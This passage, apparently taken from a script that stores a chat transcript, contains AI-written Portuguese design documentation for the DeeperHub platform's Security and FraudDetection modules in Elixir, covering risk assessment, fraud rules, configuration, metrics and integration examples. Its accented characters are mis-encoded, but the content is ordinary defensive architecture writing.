‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îú‚îÄ‚îÄ supervisor.ex                     # Supervisor principal do m√≥dulo Security
‚îú‚îÄ‚îÄ telemetry.ex                      # Telemetria do m√≥dulo Security
‚îú‚îÄ‚îÄ unified_supervisor.ex             # Supervisor unificado do m√≥dulo Security
‚îî‚îÄ‚îÄ xss_protection/                   # Prote√ß√£o XSS
    ‚îî‚îÄ‚îÄ ...
```

### 3.3. Decis√µes de Design Importantes

*   **Defesa em Profundidade:** M√∫ltiplas camadas de seguran√ßa s√£o aplicadas.
*   **Modularidade:** Cada aspecto da seguran√ßa √© tratado por um subm√≥dulo especializado, facilitando a manuten√ß√£o e atualiza√ß√£o.
*   **Configurabilidade:** As pol√≠ticas e limiares de seguran√ßa s√£o altamente configur√°veis via `SecurityPolicyManager` e `Core.ConfigManager`.
*   **Observabilidade:** Eventos de seguran√ßa, m√©tricas e logs detalhados s√£o essenciais para entender amea√ßas e respostas.
*   **Integra√ß√£o com RBAC:** O acesso a funcionalidades de gerenciamento de seguran√ßa e a sensibilidade das pol√≠ticas s√£o controlados por permiss√µes.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Verifica√ß√£o de Seguran√ßa de uma Requisi√ß√£o Web:**
    *   Um plug de seguran√ßa no pipeline Phoenix chama `DeeperHub.Security.assess_request_risk(conn)`.
    *   `SecurityManager` orquestra chamadas para:
        *   `DdosProtection.check_request/3`
        *   `BruteForceProtection.check_attempt/2` (para o IP)
        *   `SqlInjectionProtection.check_string/2` (para par√¢metros)
        *   `XssProtection.check_string/2` (para par√¢metros)
        *   `PathTraversalProtection.check_path/2`
    *   Retorna um n√≠vel de risco agregado e a√ß√µes recomendadas (permitir, bloquear, exigir CAPTCHA).
*   **An√°lise de Tentativa de Login:**
    *   `DeeperHub.Auth` chama `DeeperHub.Security.analyze_login_attempt(user_id, device_info, location_data, context)`.
    *   `SecurityManager` delega para `RiskAssessment`, `FraudDetection`, `BehavioralAnalysis`, `GeoLocationService` para avaliar o risco.
*   **Administrador Bloqueia um IP:**
    *   Atrav√©s do `DeeperHub.Console` ou UI Admin, chama `DeeperHub.Security.block_ip(ip_address, reason, duration)`.
    *   `SecurityManager` delega para `IpFirewallService` (ou similar), que atualiza o `SecurityCache` e o storage.
*   **Sistema Detecta Atividade de Fraude em Transa√ß√£o:**
    *   `DeeperHub.Security.FraudDetection` detecta uma transa√ß√£o fraudulenta.
    *   `FraudDetection` publica um evento (`fraud.detected`).
    *   `DeeperHub.Security.Monitoring` recebe o evento e gera um alerta.
    *   `DeeperHub.Notifications` envia o alerta para a equipe de seguran√ßa.

## üåä 5. Fluxos Importantes

### Fluxo de Avalia√ß√£o de Risco de uma Opera√ß√£o Sens√≠vel

1.  **M√≥dulo de Dom√≠nio:** Antes de executar uma opera√ß√£o cr√≠tica (ex: `DeeperHub.Accounts.update_sensitive_profile_field`), chama `DeeperHub.Security.assess_operation_risk(user_id, :profile_update, context_data)`.
2.  **`DeeperHub.Security.SecurityManager`:**
    *   Coleta informa√ß√µes adicionais (hist√≥rico do usu√°rio, reputa√ß√£o do IP, etc.).
    *   Chama `DeeperHub.Security.RiskAssessment.assess_risk(user_id, operation_type, full_context)`.
3.  **`DeeperHub.Security.RiskAssessment.RiskAssessmentService`:**
    *   Usa `RiskFactorCalculator` para obter fatores de risco b√°sicos (localiza√ß√£o, dispositivo).
    *   Usa `AdvancedRiskFactors` para obter fatores de comportamento, velocidade de viagem, etc.
    *   Usa `RiskCalculator` para combinar os fatores e seus pesos (definidos em `SecurityPolicyManager`) e calcular um `risk_score`.
    *   Usa `RiskActionRecommender` para determinar a√ß√µes recomendadas com base no score e nas pol√≠ticas.
4.  **`DeeperHub.Security.SecurityManager`:** Retorna o resultado da avalia√ß√£o (ex: `{:ok, %{risk_level: :high, actions: [:require_mfa, :notify_user]}}`).
5.  **M√≥dulo de Dom√≠nio:** Age conforme as recomenda√ß√µes (ex: redireciona para fluxo MFA).

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Security`)

A API da fachada `DeeperHub.Security` seria mais focada em orquestra√ß√£o e verifica√ß√µes de alto n√≠vel. As APIs detalhadas residem nas fachadas dos subm√≥dulos.

### 6.1. `DeeperHub.Security.assess_request_risk(conn_or_context :: map() | Plug.Conn.t()) :: {:ok, %{risk_level: atom(), recommended_action: atom(), details: map()}} | {:error, term()}`

*   **Descri√ß√£o:** Avalia o risco de uma requisi√ß√£o HTTP ou um contexto gen√©rico.
*   **Par√¢metros:**
    *   `conn_or_context`: A `Plug.Conn` ou um mapa com dados da requisi√ß√£o (IP, headers, path, params).
*   **Retorno:**
    *   `risk_level`: `:low`, `:medium`, `:high`, `:critical`.
    *   `recommended_action`: `:allow`, `:challenge_captcha`, `:require_mfa`, `:block`, `:log_suspicious`.
    *   `details`: Fatores que contribu√≠ram para a avalia√ß√£o.

### 6.2. `DeeperHub.Security.analyze_login_attempt(user_id :: String.t() | nil, device_info :: map(), location_data :: map(), context :: map()) :: {:ok, LoginAnalysis.t()} | {:error, term()}`

*   **Descri√ß√£o:** Analisa uma tentativa de login de forma abrangente. (Delega para `SecurityManager`).
*   **`LoginAnalysis.t()`:** `%{risk_score: float(), risk_level: atom(), actions: list(atom()), details: map()}`.

### 6.3. `DeeperHub.Security.assess_operation_risk(user_id :: String.t() | nil, operation_type :: atom(), operation_data :: map(), context :: map()) :: {:ok, OperationRisk.t()} | {:error, term()}`

*   **Descri√ß√£o:** Avalia o risco de uma opera√ß√£o de neg√≥cio espec√≠fica.
*   **`operation_type`:** Ex: `:transfer_funds`, `:update_profile_email`, `:delete_account`.
*   **`operation_data`:** Dados espec√≠ficos da opera√ß√£o (ex: valor da transfer√™ncia, novo email).
*   **`OperationRisk.t()`:** Similar a `LoginAnalysis.t()`.

### 6.4. `DeeperHub.Security.block_ip(ip_address :: String.t(), reason :: String.t(), duration_seconds :: integer() | nil, opts :: keyword()) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Bloqueia um endere√ßo IP. (Delega para `IpFirewallService` ou similar).

### 6.5. `DeeperHub.Security.is_ip_blocked?(ip_address :: String.t()) :: boolean()`

*   **Descri√ß√£o:** Verifica se um IP est√° bloqueado.

*(Outras fun√ß√µes de conveni√™ncia podem ser adicionadas conforme necess√°rio, mas o grosso da API estar√° nos subm√≥dulos.)*

## ‚öôÔ∏è 7. Configura√ß√£o

As configura√ß√µes dos subm√≥dulos de seguran√ßa s√£o gerenciadas pelo `DeeperHub.Core.ConfigManager` e/ou pelo `DeeperHub.Security.Policy.SecurityPolicyManager`.

Exemplos de chaves de configura√ß√£o (os subm√≥dulos teriam suas pr√≥prias se√ß√µes detalhadas):

*   `[:security, :default_action_on_high_risk]` (Atom): A√ß√£o padr√£o para eventos de alto risco (ex: `:block`).
*   `[:security, :log_sanitizer, :enabled]` (Boolean).
*   `[:security, :response_sanitizer, :enabled]` (Boolean).
*   `[:security, :device_fingerprint, :trusted_device_expiry_days]` (Integer).
*   **Pol√≠ticas espec√≠ficas (via `SecurityPolicyManager`):**
    *   Limiares para detec√ß√£o de fraude.
    *   N√∫mero de tentativas para bloqueio por for√ßa bruta.
    *   Regras de detec√ß√£o de intrus√£o.
    *   Pesos para fatores de risco.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Repo`, `Core.Cache`, `Core.EncryptionService`.
*   `DeeperHub.Auth`: Para obter informa√ß√µes de usu√°rio autenticado e sess√µes.
*   `DeeperHub.MFA`, `DeeperHub.OAuth`, `DeeperHub.RBAC`.
*   `DeeperHub.Audit`: Para registrar eventos de seguran√ßa.
*   `DeeperHub.Notifications`: Para enviar alertas de seguran√ßa.
*   Todos os subm√≥dulos de `DeeperHub.Security.*`.

### 8.2. Bibliotecas Externas

*   Depend√™ncias espec√≠ficas de cada subm√≥dulo (ex: bibliotecas para an√°lise de User-Agent, GeoIP, algoritmos de ML para fraude/comportamento).
*   Bibliotecas de sanitiza√ß√£o HTML/SQL (ex: `HtmlSanitizeEx`, `Moebius` para Ecto).

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Plugs de Seguran√ßa (Phoenix):** Criar plugs para serem adicionados aos pipelines do router para verifica√ß√µes de seguran√ßa em cada requisi√ß√£o (DDoS, Rate Limit, valida√ß√£o de entrada b√°sica).
    ```elixir
    pipeline :api_secure do
      plug DeeperHubWeb.Plugs.ApiSecurityChecks # Plug que chama DeeperHub.Security.assess_request_risk
      plug DeeperHubWeb.Plugs.AuthApiTokenPlug
      # ...
    end
    ```
*   **Verifica√ß√µes em Controllers/Servi√ßos:**
    ```elixir
    def process_critical_action(user_id, params, context) do
      case DeeperHub.Security.assess_operation_risk(user_id, :critical_action_x, params, context) do
        {:ok, %{risk_level: risk_level, recommended_action: action}} when risk_level in [:low, :medium] and action == :allow ->
          # Prosseguir com a a√ß√£o
          # ...
        {:ok, %{recommended_action: :require_mfa}} ->
          {:error, :mfa_required_for_security}
        _ ->
          DeeperHub.Security.Monitoring.generate_alert(
            %{type: :high_risk_operation_denied, user_id: user_id, operation: :critical_action_x},
            context
          )
          {:error, :operation_too_risky}
      end
    end
    ```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Cada subm√≥dulo de seguran√ßa deve ter seu pr√≥prio conjunto extensivo de testes unit√°rios e de integra√ß√£o.
*   Testes de integra√ß√£o para o `SecurityManager` verificando a orquestra√ß√£o correta entre subm√≥dulos.
*   Cen√°rios de ataque simulados para validar a efic√°cia das prote√ß√µes (ex: testes de penetra√ß√£o automatizados b√°sicos).
*   Localiza√ß√£o: `test/deeper_hub/security/` e subdiret√≥rios para cada componente.

### 10.2. M√©tricas

M√©tricas de alto n√≠vel para o `SecurityManager` e m√©tricas detalhadas nos subm√≥dulos.
*   `deeper_hub.security.requests.assessed.count` (tags: `risk_level`, `action_taken`)
*   `deeper_hub.security.operations.risk_assessed.count` (tags: `operation_type`, `risk_level`)
*   `deeper_hub.security.active_threats.gauge` (Gauge): Uma m√©trica agregada indicando o n√≠vel de amea√ßa atual ao sistema.
*   *(M√©tricas espec√≠ficas de cada subm√≥dulo, como `fraud_detection.analyzed.count`, `brute_force.ip_blocked.count`, etc.)*

### 10.3. Logs

*   **N√≠vel INFO:** Opera√ß√µes de seguran√ßa bem-sucedidas com baixo risco.
*   **N√≠vel WARNING:** Detec√ß√µes de risco m√©dio, bloqueios tempor√°rios, atividades suspeitas que n√£o justificam bloqueio imediato.
*   **N√≠vel ERROR/CRITICAL:** Detec√ß√µes de alto/cr√≠tico risco, bloqueios permanentes, falhas nos sistemas de seguran√ßa.
*   **Auditoria:** Todas as decis√µes de seguran√ßa, bloqueios, altera√ß√µes de pol√≠tica e detec√ß√µes significativas devem ser auditadas.

### 10.4. Telemetria

Eventos Telemetry para opera√ß√µes chave de orquestra√ß√£o e decis√£o do `SecurityManager`:
*   `[:deeper_hub, :security, :request_assessment, :start | :stop | :exception]`
    *   Metadados: `%{path: path, ip: ip, result_risk_level: level, action_taken: action}`
*   `[:deeper_hub, :security, :operation_assessment, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, operation: type, result_risk_level: level, action_taken: action}`
*   *(Subm√≥dulos emitir√£o seus pr√≥prios eventos Telemetry detalhados).*

## ‚ùå 11. Tratamento de Erros

*   Falhas em um subm√≥dulo de seguran√ßa n√£o devem, idealmente, derrubar a avalia√ß√£o de seguran√ßa como um todo, mas podem aumentar o n√≠vel de risco ou levar a uma a√ß√£o padr√£o mais segura (ex: \"negar por padr√£o\").
*   O `SecurityManager` deve ser resiliente a falhas parciais dos componentes que orquestra.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo Security)

*   **Configura√ß√£o Segura:** As pol√≠ticas e configura√ß√µes dos subm√≥dulos de seguran√ßa devem ser protegidas contra altera√ß√µes n√£o autorizadas (`SecurityPolicyManager` com RBAC).
*   **Segredo de Chaves:** Chaves usadas para HMAC, criptografia, etc., devem ser gerenciadas de forma segura pelo `Core.EncryptionService`.
*   **Evitar Falsos Positivos:** Embora a seguran√ßa seja priorit√°ria, as regras e limiares devem ser calibrados para minimizar o impacto em usu√°rios leg√≠timos.
*   **Performance:** As verifica√ß√µes de seguran√ßa n√£o devem introduzir lat√™ncia excessiva nas requisi√ß√µes. O uso de caches e otimiza√ß√µes √© vital.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Qualquer adi√ß√£o ou altera√ß√£o a um subm√≥dulo de seguran√ßa deve considerar seu impacto na postura de seguran√ßa geral e ser coordenada atrav√©s do `SecurityManager` se afetar m√∫ltiplas √°reas.
*   Privilegie a falha segura (fail-closed) para mecanismos de prote√ß√£o.
*   Mantenha os testes atualizados, especialmente com novos vetores de ataque ou cen√°rios de seguran√ßa.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar um \"Security Dashboard\" que consolide informa√ß√µes de todos os subm√≥dulos.
*   [ ] Adicionar playbooks de resposta a incidentes automatizados para certos tipos de alertas.
*   [ ] Integra√ß√£o com feeds de intelig√™ncia de amea√ßas externas (ex: listas de IPs maliciosos conhecidos).
*   [ ] Desenvolver capacidades de aprendizado de m√°quina mais avan√ßadas para `BehavioralAnalysis` e `FraudDetection` para adapta√ß√£o din√¢mica a novas amea√ßas.
*   [ ] Permitir que administradores configurem \"modos de seguran√ßa\" globais (ex: modo de alta seguran√ßa durante um ataque percebido, que aperta todos os limiares).

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

Este m√≥dulo `DeeperHub.Security` √© um grande orquestrador! Ele depende de muitos outros subm√≥dulos bem definidos para funcionar.

Podemos agora focar em um desses subm√≥dulos de seguran√ßa, como `DeeperHub.Security.FraudDetection` ou `DeeperHub.Security.BruteForceProtection`, ou ir para um outro m√≥dulo Core como `DeeperHub.Core.Repo`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos detalhar o `DeeperHub.Security.FraudDetection`, um componente vital dentro do m√≥dulo `Security`.

---

# M√≥dulo: `DeeperHub.Security.FraudDetection` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.FraudDetection`

O m√≥dulo `DeeperHub.Security.FraudDetection` √© dedicado a identificar, prevenir e gerenciar atividades fraudulentas dentro do sistema DeeperHub. Ele analisa diversos tipos de intera√ß√µes e transa√ß√µes dos usu√°rios, aplicando um conjunto de regras, heur√≠sticas e, potencialmente, modelos de aprendizado de m√°quina para detectar comportamentos que se desviam do normal ou que correspondem a padr√µes de fraude conhecidos.

As principais √°reas de an√°lise incluem tentativas de login, altera√ß√µes de perfil, transa√ß√µes financeiras (se aplic√°vel), uso da API e anomalias biom√©tricas. O objetivo √© minimizar perdas financeiras, proteger contas de usu√°rios contra comprometimento e manter a integridade da plataforma. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **An√°lise de Atividades para Detec√ß√£o de Fraude:**
    *   **Login (`analyze_login/1`):** Avaliar o risco de tentativas de login com base em fatores como localiza√ß√£o, dispositivo, hist√≥rico, velocidade de viagem, IPs suspeitos.
    *   **Altera√ß√µes de Perfil (`analyze_profile_changes/1`):** Detectar altera√ß√µes suspeitas em dados cr√≠ticos do perfil (ex: email, telefone, senha, endere√ßo) feitas rapidamente ou de locais/dispositivos incomuns.
    *   **Transa√ß√µes (se aplic√°vel):** Monitorar transa√ß√µes financeiras ou de itens de valor para padr√µes fraudulentos (ex: valores incomuns, frequ√™ncia, destinat√°rios suspeitos).
    *   **Uso de API (`analyze_api_usage/1`):** Identificar abuso de API, scraping ou atividades automatizadas maliciosas.
    *   **Anomalias Biom√©tricas (`record_biometric_anomaly/1`):** Receber e processar alertas do m√≥dulo `DeeperHub.Biometrics` sobre desvios comportamentais.
*   **Gerenciamento de Regras de Detec√ß√£o:**
    *   Permitir a cria√ß√£o, atualiza√ß√£o, exclus√£o e consulta de regras de detec√ß√£o de fraude (via `RulesManagerService`).
    *   Suportar diferentes tipos de condi√ß√µes e pesos para as regras.
*   **C√°lculo de Pontua√ß√£o de Risco (Risk Scoring):**
    *   Atribuir uma pontua√ß√£o de risco a cada evento/atividade analisada com base nas regras acionadas e outros fatores.
    *   Classificar o risco em n√≠veis (ex: baixo, m√©dio, alto, cr√≠tico) (via `RiskCalculatorService`).
*   **Registro de Detec√ß√µes:**
    *   Armazenar todas as detec√ß√µes de fraude, incluindo detalhes, contexto, pontua√ß√£o de risco e status (via `DetectionRecorderService`).
*   **Gerenciamento de Casos de Fraude:**
    *   Permitir que analistas de seguran√ßa revisem detec√ß√µes, adicionem notas e atualizem o status (ex: falso positivo, fraude confirmada, resolvido) (via `Core` ou `DetectionRecorderService`).
*   **Notifica√ß√µes e Alertas:**
    *   Notificar a equipe de seguran√ßa e/ou usu√°rios sobre detec√ß√µes de fraude de alta criticidade (via `FraudNotifierService` e `DeeperHub.Notifications`).
*   **Integra√ß√£o com Outros M√≥dulos de Seguran√ßa:**
    *   Utilizar dados do `LoginLocation`, `DeviceFingerprint`, `BehavioralAnalysis` para enriquecer a an√°lise.
    *   Fornecer informa√ß√µes para o `SecurityManager` tomar decis√µes (ex: bloquear usu√°rio, exigir MFA adicional).
*   **Relat√≥rios e Estat√≠sticas:**
    *   Gerar relat√≥rios sobre tend√™ncias de fraude, efic√°cia das regras, etc.
    *   Fornecer estat√≠sticas sobre detec√ß√µes e n√≠veis de risco.

## üèóÔ∏è 3. Arquitetura e Design

O `DeeperHub.Security.FraudDetection` √© um m√≥dulo complexo que geralmente √© composto por v√°rios servi√ßos e componentes especializados.

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.FraudDetection` (Fachada P√∫blica):**
    *   Ponto de entrada para o sistema de detec√ß√£o de fraude.
    *   Delega chamadas para o `FraudDetectionService` ou diretamente para servi√ßos especializados.
2.  **`DeeperHub.Security.FraudDetection.Services.DefaultFraudDetectionService` (ou `FraudDetectionCoreService`):**
    *   Servi√ßo central que orquestra o processo de an√°lise.
    *   Recebe dados de eventos, aplica regras, calcula riscos e registra detec√ß√µes.
    *   Pode ser um GenServer para gerenciar estado ou executar tarefas ass√≠ncronas.
3.  **`DeeperHub.Security.FraudDetection.Services.RulesManagerService` (GenServer):**
    *   Respons√°vel por carregar, armazenar e fornecer acesso √†s regras de detec√ß√£o de fraude.
    *   Permite a atualiza√ß√£o din√¢mica de regras.
4.  **`DeeperHub.Security.FraudDetection.Services.RiskCalculatorService` (GenServer ou M√≥dulo Funcional):**
    *   Cont√©m a l√≥gica para calcular a pontua√ß√£o de risco com base nos fatores identificados e nos pesos das regras.
5.  **`DeeperHub.Security.FraudDetection.Services.DetectionRecorderService` (GenServer):**
    *   Respons√°vel por persistir os registros de detec√ß√µes de fraude.
    *   Gerencia o ciclo de vida das detec√ß√µes (status, notas).
6.  **`DeeperHub.Security.FraudDetection.Services.FraudNotifierService` (GenServer):**
    *   Respons√°vel por enviar notifica√ß√µes e alertas com base nas detec√ß√µes.
7.  **`DeeperHub.Security.FraudDetection.Schema.FraudDetectionSchema`:**
    *   Schema Ecto para armazenar os registros de detec√ß√£o de fraude.
8.  **`DeeperHub.Security.FraudDetection.Schema.RiskFactors` e `RiskScore` (Opcional):**
    *   Schemas para detalhar os fatores que contribu√≠ram para uma pontua√ß√£o de risco.
9.  **Workers (`AnalysisWorker`, `CleanupWorker`):**
    *   `AnalysisWorker`: Para an√°lises peri√≥dicas de padr√µes de fraude mais complexos ou em lote.
    *   `CleanupWorker`: Para limpar dados antigos de detec√ß√£o.
10. **Integra√ß√µes:**
    *   `AuditIntegration`: Para logar eventos de fraude.
    *   `EventIntegration`: Para publicar/subscrever eventos relacionados √† fraude.
    *   `MetricsReporter` ou `Telemetry`: Para registrar m√©tricas.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/fraud_detection/
‚îú‚îÄ‚îÄ fraud_detection.ex                # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îú‚îÄ‚îÄ default_fraud_detection_service.ex # Servi√ßo orquestrador
‚îÇ   ‚îú‚îÄ‚îÄ rules_manager_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ risk_calculator_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ detection_recorder_service.ex
‚îÇ   ‚îî‚îÄ‚îÄ fraud_notifier_service.ex
‚îÇ
‚îú‚îÄ‚îÄ schemas/
‚îÇ   ‚îú‚îÄ‚îÄ fraud_detection_schema.ex
‚îÇ   ‚îú‚îÄ‚îÄ risk_factors.ex               # Opcional
‚îÇ   ‚îî‚îÄ‚îÄ risk_score.ex                 # Opcional
‚îÇ
‚îú‚îÄ‚îÄ rules/                            # Onde as defini√ß√µes de regras podem residir
‚îÇ   ‚îî‚îÄ‚îÄ login_rules.ex
‚îÇ
‚îú‚îÄ‚îÄ integrations/
‚îÇ   ‚îú‚îÄ‚îÄ audit_integration.ex
‚îÇ   ‚îî‚îÄ‚îÄ event_integration.ex          # (Pode ser gerenciado centralmente em Security/Integrations)
‚îÇ
‚îú‚îÄ‚îÄ workers/
‚îÇ   ‚îú‚îÄ‚îÄ analysis_worker.ex
‚îÇ   ‚îî‚îÄ‚îÄ cleanup_worker.ex
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex                      # (ou MetricsReporter.ex)
```

### 3.3. Decis√µes de Design Importantes

*   **Sistema Baseado em Regras Extens√≠vel:** A capacidade de adicionar e modificar regras dinamicamente √© crucial.
*   **Pontua√ß√£o de Risco Flex√≠vel:** O `RiskCalculatorService` deve permitir diferentes modelos de pontua√ß√£o e pondera√ß√£o de fatores.
*   **Feedback Loop:** O sistema deve permitir que analistas marquem detec√ß√µes como falsos positivos, o que pode ser usado para treinar/ajustar modelos ou regras.
*   **Processamento em Tempo Real e em Lote:** Algumas an√°lises precisam ser em tempo real (ex: login), enquanto outras podem ser feitas em lote (ex: an√°lise de padr√µes hist√≥ricos).

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Tentativa de Login de um Novo Dispositivo e Localiza√ß√£o:**
    *   `DeeperHub.Auth` envia dados do login para `FraudDetection.analyze_login/1`.
    *   O servi√ßo aplica regras como \"novo dispositivo\", \"nova localiza√ß√£o\", \"viagem imposs√≠vel\".
    *   Calcula um score de risco. Se alto, pode recomendar MFA adicional ou bloquear temporariamente.
*   **Usu√°rio Altera Email e Senha Rapidamente:**
    *   `DeeperHub.Accounts` envia dados das altera√ß√µes para `FraudDetection.analyze_profile_changes/1`.
    *   Regras para \"m√∫ltiplas altera√ß√µes sens√≠veis em curto per√≠odo\" s√£o acionadas.
    *   Score de risco alto -> notifica√ß√£o para o usu√°rio sobre as altera√ß√µes.
*   **Detec√ß√£o de Padr√£o de Abuso de API:**
    *   `DeeperHub.API` envia dados de uso para `FraudDetection.analyze_api_usage/1`.
    *   Regras de \"alta frequ√™ncia de requisi√ß√µes\" ou \"acesso a endpoints sens√≠veis de forma incomum\" s√£o acionadas.
    *   Risco alto -> pode levar a rate limiting mais agressivo ou bloqueio tempor√°rio do cliente API.

## üåä 5. Fluxos Importantes

### Fluxo de An√°lise de Fraude para um Evento (ex: Login)

1.  **Evento de Entrada:** `FraudDetection.analyze_login(login_info)` √© chamado.
2.  **`DefaultFraudDetectionService`:**
    *   Coleta dados contextuais adicionais (hist√≥rico do usu√°rio, reputa√ß√£o do IP, etc.).
    *   Recupera as regras relevantes para o tipo de evento \"login\" do `RulesManagerService`.
3.  **Aplica√ß√£o de Regras:**
    *   Para cada regra, avalia se as condi√ß√µes s√£o atendidas com base nos dados do evento e contexto.
    *   Coleta os fatores de risco e as pontua√ß√µes parciais das regras acionadas.
4.  **`RiskCalculatorService`:**
    *   Recebe os fatores de risco e suas pontua√ß√µes/pesos.
    *   Calcula a pontua√ß√£o de risco final e o n√≠vel de risco (baixo, m√©dio, alto, cr√≠tico).
5.  **`DetectionRecorderService`:**
    *   Se a pontua√ß√£o de risco exceder um limiar m√≠nimo para registro, um novo `FraudDetectionSchema` √© criado e persistido com todos os detalhes.
6.  **`FraudNotifierService`:**
    *   Se o n√≠vel de risco for alto o suficiente para justificar uma notifica√ß√£o imediata, envia alertas para a equipe de seguran√ßa ou para o usu√°rio (via `DeeperHub.Notifications`).
7.  **Resposta:** O `DefaultFraudDetectionService` retorna o resultado da an√°lise (n√≠vel de risco, ID da detec√ß√£o, a√ß√µes recomendadas) para o chamador.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Security.FraudDetection`)

*(Muitas j√° foram descritas na documenta√ß√£o original. Foco em clareza e exemplos.)*

### 6.1. `DeeperHub.Security.FraudDetection.analyze_login(login_info :: map()) :: {:ok, FraudAnalysisResult.t()} | {:error, term()}`

*   **Descri√ß√£o:** Analisa uma tentativa de login para detectar fraude.
*   **`login_info`:** `%{user_id: String.t(), ip_address: String.t(), user_agent: String.t(), location: map() | nil, success: boolean()}`
*   **`FraudAnalysisResult.t()`:** `%{risk_score: float(), risk_level: atom(), detection_id: String.t() | nil, details: map()}`
*   **Exemplo:**
    ```elixir
    login_data = %{user_id: \"u1\", ip_address: \"1.2.3.4\", user_agent: \"...\", success: true}
    case FraudDetection.analyze_login(login_data) do
      {:ok, result} -> Logger.info(\"An√°lise de login: #{inspect(result)}\")
      {:error, e} -> Logger.error(\"Erro na an√°lise de login: #{inspect(e)}\")
    end
    ```

### 6.2. `DeeperHub.Security.FraudDetection.add_rule(rule_definition :: map()) :: {:ok, Rule.t()} | {:error, term()}`

*   **Descri√ß√£o:** Adiciona uma nova regra de detec√ß√£o de fraude.
*   **`rule_definition`:** `%{name: String.t(), detection_type: atom(), conditions: list(map()), action_score: integer(), enabled: boolean()}`
*   **Exemplo:**
    ```elixir
    rule = %{name: \"High value transfer from new device\", detection_type: :transaction, conditions: [...], action_score: 70}
    FraudDetection.add_rule(rule)
    ```

### 6.3. `DeeperHub.Security.FraudDetection.update_detection_status(detection_id :: String.t(), status :: atom(), reviewer_id :: String.t(), notes :: String.t() | nil) :: {:ok, FraudDetectionSchema.t()} | {:error, term()}`

*   **Descri√ß√£o:** Atualiza o status de uma detec√ß√£o (ex: `:reviewed`, `:false_positive`, `:confirmed_fraud`).

*(Outras fun√ß√µes como `analyze_profile_changes/1`, `analyze_transaction/1`, `get_rules/1`, `list_detections/1` seguiriam um padr√£o similar.)*

## ‚öôÔ∏è 7. Configura√ß√£o

Configura√ß√µes gerenciadas pelo `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :fraud_detection, :enabled]`** (Boolean): Habilita/desabilita o sistema de detec√ß√£o de fraude. (Padr√£o: `true`)
*   **`[:security, :fraud_detection, :default_risk_thresholds]`** (Map): Limiares padr√£o para classificar scores de risco (ex: `%{low: 20, medium: 50, high: 75, critical: 90}`).
*   **`[:security, :fraud_detection, :rules_source]`** (Atom ou String): Fonte para carregar as regras de detec√ß√£o (ex: `:config_file`, `:database`, ou caminho para um arquivo).
*   **`[:security, :fraud_detection, :rules_file_path]`** (String): Caminho para o arquivo de regras, se `rules_source` for `:config_file`.
*   **`[:security, :fraud_detection, :record_all_analyses]`** (Boolean): Se deve registrar todas as an√°lises, mesmo as de baixo risco. (Padr√£o: `false`, registrar apenas acima de um limiar)
*   **`[:security, :fraud_detection, :min_score_to_record]`** (Integer): Pontua√ß√£o m√≠nima para registrar uma detec√ß√£o. (Padr√£o: `30`)
*   **`[:security, :fraud_detection, :notification_thresholds]`** (Map): Limiares de risco para diferentes canais de notifica√ß√£o (ex: `%{email: :high, sms: :critical}`).
*   **`[:security, :fraud_detection, :cleanup_worker, :retention_days]`** (Integer): Por quantos dias manter os registros de detec√ß√£o. (Padr√£o: `180`)
*   **`[:security, :fraud_detection, :analysis_worker, :batch_size]`** (Integer): Tamanho do lote para an√°lise em background.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Repo`.
*   `DeeperHub.Auth`: Para informa√ß√µes de usu√°rio e sess√£o.
*   `DeeperHub.Accounts`: Para dados de perfil.
*   `DeeperHub.API`: Para dados de uso da API.
*   `DeeperHub.Biometrics`: Para dados de anomalias biom√©tricas.
*   `DeeperHub.Security.LoginLocation`: Para dados de localiza√ß√£o.
*   `DeeperHub.Security.DeviceFingerprint`: Para dados de dispositivo.
*   `DeeperHub.Security.RiskAssessment`: Pode ser usado como um dos insumos para a pontua√ß√£o de fraude ou ser o resultado dela.
*   `DeeperHub.Notifications`: Para enviar alertas.
*   `DeeperHub.Audit`: Para registrar detec√ß√µes e a√ß√µes.

### 8.2. Bibliotecas Externas

*   Bibliotecas de Machine Learning (opcional, ex: `Nx`, `Axon`, `Scholar`) se modelos de ML forem usados.
*   Bibliotecas para processamento de regras (opcional, ex: `RuleEx`).

## ü§ù 9. Como Usar / Integra√ß√£o

Os m√≥dulos de dom√≠nio (Accounts, API, etc.) devem chamar as fun√ß√µes `analyze_*` da fachada `DeeperHub.Security.FraudDetection` quando eventos relevantes ocorrem.

**Exemplo em `DeeperHub.Accounts` ao atualizar email:**
```elixir
def update_email(user, new_email, context_info) do
  # ... (l√≥gica de atualiza√ß√£o do email) ...

  # An√°lise de fraude
  profile_change_info = %{
    user_id: user.id,
    changes: %{email: new_email},
    ip_address: context_info.ip_address,
    # ... outros dados de contexto
  }
  case DeeperHub.Security.FraudDetection.analyze_profile_changes(profile_change_info) do
